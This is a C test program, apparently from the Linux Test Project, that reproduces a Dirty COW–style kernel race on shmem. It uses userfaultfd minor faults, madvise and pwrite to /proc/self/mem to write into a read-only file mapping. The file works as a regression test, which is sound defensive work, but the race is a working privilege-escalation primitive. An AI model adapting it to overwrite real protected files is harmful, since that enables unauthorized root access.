// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2022 Red Hat, Inc.
 *  Based on original reproducer: https://seclists.org/oss-sec/2022/q3/128
 */

#include "config.h"

#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pwd.h>
#include <poll.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

#define TST_NO_DEFAULT_MAIN
#include "tst_test.h"
#include "tst_safe_macros.h"
#include "tst_safe_pthread.h"
#include "lapi/userfaultfd.h"

#define TMP_DIR "tmp_dirtyc0w_shmem"
#define TEST_FILE TMP_DIR"/testfile"

static char *str = "m00000000000000000";
static void *map;
static int mem_fd;
static int uffd;
static size_t page_size;

static void *stress_thread_fn(void *arg)
{
	while (1)
		/* Don't optimize the busy loop out. */
		asm volatile("" : "+r" (arg));

	return NULL;
}

static void *discard_thread_fn(void *arg)
{
	(void)arg;

	while (1) {
		char tmp;

		/*
		 * Zap that page first, such that we can trigger a new
		 * minor fault.
		 */
		madvise(map, page_size, MADV_DONTNEED);
		/*
		 * Touch the page to trigger a UFFD minor fault. The uffd
		 * thread will resolve the minor fault via a UFFDIO_CONTINUE.
		 */
		tmp = *((char *)map);
		/* Don't optimize the read out. */
		asm volatile("" : "+r" (tmp));
	}

	return NULL;
}

static void *write_thread_fn(void *arg)
{
	(void)arg;

	while (1)
		/*
		 * Ignore any errors -- errors mean that pwrite() would
		 * have to trigger a uffd fault and sleep, which the GUP
		 * variant doesn't support, so it fails with an I/O errror.
		 *
		 * Once we retry and are lucky to already find the placed
		 * page via UFFDIO_CONTINUE (from the other threads), we get
		 * no error.
		 */
		pwrite(mem_fd, str, strlen(str), (uintptr_t) map);

	return NULL;
}

static void *uffd_thread_fn(void *arg)
{
	static struct uffd_msg msg;
	struct uffdio_continue uffdio;
	struct uffdio_range uffdio_wake;

	(void)arg;

	while (1) {
		struct pollfd pollfd;
		int nready, nread;

		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);
		if (nready < 0)
			tst_brk(TBROK | TERRNO, "Error on poll");

		nread = read(uffd, &msg, sizeof(msg));
		if (nread <= 0)
			continue;

		uffdio.range.start = (unsigned long) map;
		uffdio.range.len = page_size;
		uffdio.mode = 0;
		if (ioctl(uffd, UFFDIO_CONTINUE, &uffdio) < 0) {
			if (errno == EEXIST) {
				uffdio_wake.start = (unsigned long) map;
				uffdio_wake.len = page_size;
				SAFE_IOCTL(uffd, UFFDIO_WAKE, &uffdio_wake);
			}
		}
	}

	return NULL;
}

static void setup_uffd(void)
{
	struct uffdio_register uffdio_register;
	struct uffdio_api uffdio_api;

	uffd = SAFE_USERFAULTFD(O_CLOEXEC | O_NONBLOCK, true);

	uffdio_api.api = UFFD_API;
	uffdio_api.features = UFFD_FEATURE_MINOR_SHMEM;
	TEST(ioctl(uffd, UFFDIO_API, &uffdio_api));
	if (TST_RET < 0) {
		if (TST_ERR == EINVAL) {
			tst_brk(TCONF,
				"System does not have userfaultfd minor fault support for shmem");
		}
		tst_brk(TBROK | TTERRNO,
			"Could not create userfault file descriptor");
	}

	if (!(uffdio_api.features & UFFD_FEATURE_MINOR_SHMEM))
		tst_brk(TCONF, "System does not have userfaultfd minor fault support for shmem");

	uffdio_register.range.start = (unsigned long) map;
	uffdio_register.range.len = page_size;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MINOR;
	SAFE_IOCTL(uffd, UFFDIO_REGISTER, &uffdio_register);
}

static void sighandler(int sig)
{
	(void) sig;

	_exit(0);
}

int main(void)
{
	pthread_t thread1, thread2, thread3, *stress_threads;
	int fd, i, num_cpus;
	struct stat st;

	tst_reinit();

	SAFE_SIGNAL(SIGUSR1, sighandler);

	page_size = getpagesize();
	num_cpus = sysconf(_SC_NPROCESSORS_ONLN);

	/* Create some threads that stress all CPUs to make the race easier to reproduce. */
	stress_threads = malloc(sizeof(*stress_threads) * num_cpus * 2);
	for (i = 0; i < num_cpus * 2; i++)
		pthread_create(stress_threads + i, NULL, stress_thread_fn, NULL);

	TST_CHECKPOINT_WAKE(0);

	fd = SAFE_OPEN(TEST_FILE, O_RDONLY);
	SAFE_FSTAT(fd, &st);

	/*
	 * We need a read-only private mapping of the file. Ordinary write-access
	 * via the page tables is impossible, however, we can still perform a
	 * write access that bypasses missing PROT_WRITE permissions using ptrace
	 * (/proc/self/mem). Such a write access is supposed to properly replace
	 * the pagecache page by a private copy first (break COW), such that we are
	 * never able to modify the pagecache page.
	 *
	 * We want the following sequence to trigger. Assuming the pagecache page is
	 * mapped R/O already (e.g., due to previous action from Thread 1):
	 * Thread 2: pwrite() [start]
	 *  -> Trigger write fault, replace mapped page by anonymous page
	 *  -> COW was broken, remember FOLL_COW
	 * Thread 1: madvise(map, 4096, MADV_DONTNEED);
	 *  -> Discard anonymous page
	 * Thread 1: tmp += *((int *)map);
	 *  -> Trigger a minor uffd fault
	 * Thread 3: ioctl(uffd, UFFDIO_CONTINUE
	 *  -> Resolve minor uffd fault via UFFDIO_CONTINUE
	 *  -> Map shared page R/O but set it dirty
	 * Thread 2: pwrite() [continue]
	 *  -> Find R/O mapped page that's dirty and FOLL_COW being set
	 *  -> Modify shared page R/O because we don't break COW (again)
	 */
	map = SAFE_MMAP(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	mem_fd = SAFE_OPEN("/proc/self/mem", O_RDWR);

	setup_uffd();

	SAFE_PTHREAD_CREATE(&thread1, NULL, discard_thread_fn, NULL);
	SAFE_PTHREAD_CREATE(&thread2, NULL, write_thread_fn, NULL);
	SAFE_PTHREAD_CREATE(&thread3, NULL, uffd_thread_fn, NULL);

	pause();

	return 0;
}
